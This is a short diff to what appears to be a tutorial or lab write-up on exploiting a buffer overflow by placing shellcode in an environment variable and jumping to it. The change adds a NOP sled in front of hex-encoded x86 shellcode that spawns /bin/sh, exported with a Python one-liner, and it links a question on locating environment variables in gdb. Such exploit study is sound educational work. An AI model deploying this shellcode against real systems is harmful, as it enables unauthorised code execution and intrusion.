@@ -57,7 +57,7 @@ We know that in the main arguments we have argc, argv and envp, and even if we h
 main (void)
 The env still exists in the memory, so we can store our shellcode, find the address of it and then jump to it.
 
-export SHELLCODEINJECTION=$(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 
 After we can find our env var with this command :
 https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
